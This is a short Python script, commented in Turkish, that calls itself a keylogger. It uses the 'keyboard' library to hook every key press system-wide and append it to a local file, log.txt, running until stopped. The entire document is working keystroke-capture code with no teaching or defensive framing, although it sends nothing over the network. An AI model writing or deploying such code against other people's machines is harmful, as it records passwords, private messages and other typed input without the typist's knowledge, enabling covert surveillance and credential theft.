import keyboard


# Kayıtlı tutacak dosya
log_file = 'log.txt'

# Tuşa basıldığında çalışacak fonksiyon
def on_key_press(event):
    # Dosyaya yazma işlemi
    with open(log_file, 'a') as f:
        # Tuşların ne olduğunu kontrol ediyoruz
        if event.name == 'space':
            f.write('')
        # Enter tuşuna basıldığında alt satıra iniyoruz
        elif event.name == 'enter':
            f.write('\n')
        # Diğer tuşları yazdırıyoruz
        else:
            f.write('{} '.format(event.name))

# Keylogger'ı başlatıyoruz
keyboard.on_press(on_key_press)

# Programın sürekli çalışmasını sağlıyoruz
keyboard.wait()